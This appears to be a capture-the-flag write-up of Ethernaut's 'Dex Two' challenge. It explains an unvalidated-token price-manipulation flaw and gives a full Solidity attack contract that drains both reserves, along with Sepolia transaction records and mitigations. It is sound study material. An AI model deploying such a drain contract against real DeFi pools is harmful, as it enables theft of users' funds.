# Ethernaut #23 — Dex Two

## Overview

**Challenge:** [Ethernaut — Dex Two](https://ethernaut.openzeppelin.com/)

**Concepts:** Unvalidated token addresses, price manipulation, ERC-20 interactions, trust boundaries.

**Status:** ✅ Solved

## Objective

Drain both of the DEX's token reserves.

Unlike Dex One, Dex Two does not properly restrict swaps to its two intended tokens. This allows an attacker to introduce a token they control and manipulate the DEX's pricing calculation.

## Vulnerability

The core issue is that the DEX accepts arbitrary token addresses in its `swap()` function rather than verifying that the tokens belong to its supported pair.

The swap amount is calculated using the balances of the supplied token addresses. Conceptually, the pricing formula is:

$$
\text{amountOut} =
\frac{\text{amountIn}\times \text{balanceOf}(\text{to}, \text{DEX})}
{\text{balanceOf}(\text{from}, \text{DEX})}
$$

Because the attacker controls the input token, they can manipulate the balance used as the denominator.

The DEX effectively trusts the attacker to supply a legitimate token pair, even though the attacker can deploy an arbitrary ERC-20 token.

## Exploit Strategy

1. Deploy an ERC-20 token under the attacker's control.
2. Transfer one unit of the fake token directly to the DEX, ensuring its fake-token balance is nonzero.
3. Approve the DEX to spend the attack contract's fake tokens.
4. Swap the fake token for `token1`. The DEX calculates the output using its fake-token balance and the legitimate token reserve.
5. Repeat the swap using the fake token to drain `token2`.
6. Verify that both legitimate token reserves are zero and that the attack contract received the original reserves.

The crucial detail is that the DEX calculates the output before pulling the input tokens through `transferFrom()`. The attacker can therefore use a deliberately small fake-token reserve to manipulate the price calculation.

## Proof of Concept

The following attack contract was deployed and executed on Sepolia.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract Attack {
    IDex public immutable dex;
    IERC20 private immutable t1;
    IERC20 private immutable t2;
    IERC20 public myERC20;

    constructor(IDex _dex) {
        dex = _dex;
        t1 = IERC20(dex.token1());
        t2 = IERC20(dex.token2());
    }

    function deployMyERC20(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) external {
        myERC20 = IERC20(
            address(
                new SwappableTokenTwo(
                    address(dex),
                    name,
                    symbol,
                    initialSupply
                )
            )
        );
    }

    function drain() external returns (bool) {
        uint256 myExpectedBalanceT1 =
            t1.balanceOf(address(dex));
        uint256 myExpectedBalanceT2 =
            t2.balanceOf(address(dex));

        myERC20.transfer(address(dex), 1);
        myERC20.approve(address(dex), type(uint256).max);

        dex.swap(
            address(myERC20),
            address(t1),
            myERC20.balanceOf(address(dex))
        );

        dex.swap(
            address(myERC20),
            address(t2),
            myERC20.balanceOf(address(dex))
        );

        require(
            t1.balanceOf(address(dex)) == 0,
            "T1 drain failed"
        );
        require(
            t2.balanceOf(address(dex)) == 0,
            "T2 drain failed"
        );

        return
            t1.balanceOf(address(this)) == myExpectedBalanceT1 &&
            t2.balanceOf(address(this)) == myExpectedBalanceT2;
    }
}
```

*Note: `SwappableTokenTwo` is the challenge's token implementation, reproduced separately in the attack project. The import and helper contract dependencies must be included when compiling the complete project.*

## On-Chain Proof of Concept

**Network:** Sepolia

**Target Dex Two:** `0xD25680FbaBb42EC5396A7b3A7873816280104c59`

**Attack contract:** `0x225B553FD6d0EfE6B0B6C6a40AD6AbE804c7C604`

**Fake ERC-20:** `0xeb5c52b8f1c22c0553265cf21b16fc517855b754`

### Transactions

| Action | Transaction |
|---|---|
| Deploy attack contract | [`0xe99899b0dba135a5914d86121a8b6a91bde218833c7396e6952e8ca7bd8d8734`](https://sepolia.etherscan.io/tx/0xe99899b0dba135a5914d86121a8b6a91bde218833c7396e6952e8ca7bd8d8734) |
| Deploy fake ERC-20 | [`0xf8637a7b418b093980993692cd662b3c101102313d554bb4d382d95cf9e3b444`](https://sepolia.etherscan.io/tx/0xf8637a7b418b093980993692cd662b3c101102313d554bb4d382d95cf9e3b444) |
| Execute exploit | [`0xb69338897e3a7c36fafc9dad4a14dd3011e6b8c84eaa0dd9ffe4a5e4fe27f99f`](https://sepolia.etherscan.io/tx/0xb69338897e3a7c36fafc9dad4a14dd3011e6b8c84eaa0dd9ffe4a5e4fe27f99f) |

The exploit transaction succeeded with status `1`.

### Post-Exploit Balance Verification

The following balances were queried directly on Sepolia using Foundry's `cast call`.

| Token | Dex Two balance | Attack contract balance |
|---|---:|---:|
| `token1` (`0xC89bFF878e2bdBf287c9DD0b3369C0aE8eA71EF2`) | `0` | `100` |
| `token2` (`0x8040f637eDD1b14609426802Ca0FDE73Ed0215fc`) | `0` | `100` |

Both DEX reserves were drained, and the attack contract received all 100 units of each legitimate token.

## Root Cause

The DEX uses caller-supplied token addresses for its pricing and transfer logic without enforcing that the tokens belong to its intended trading pair.

This allows an attacker-controlled ERC-20 to influence the pricing calculation and extract legitimate tokens from the DEX's reserves.

## Mitigation

- Restrict swaps to the two supported token addresses.
- Validate both input and output tokens before calculating swap amounts.
- Avoid relying on arbitrary token balances as a trustworthy pricing source.
- Use a well-defined pricing mechanism that cannot be manipulated by introducing an attacker-controlled asset.

## Key Takeaway

**Never trust arbitrary token addresses in a swap function.**

A pricing formula can be mathematically correct and still be exploitable when an attacker controls the values used in that formula.

This challenge reinforced the importance of tracing ERC-20 transfers, understanding the order of operations, and checking which assumptions a smart contract makes about user-supplied addresses.

## Conclusion

Dex Two was solved by deploying a custom ERC-20 token, using its balance to manipulate the DEX's swap calculation, and draining both legitimate token reserves.

The exploit was successfully reproduced on Sepolia, with on-chain balance checks confirming that both reserves were reduced to zero.
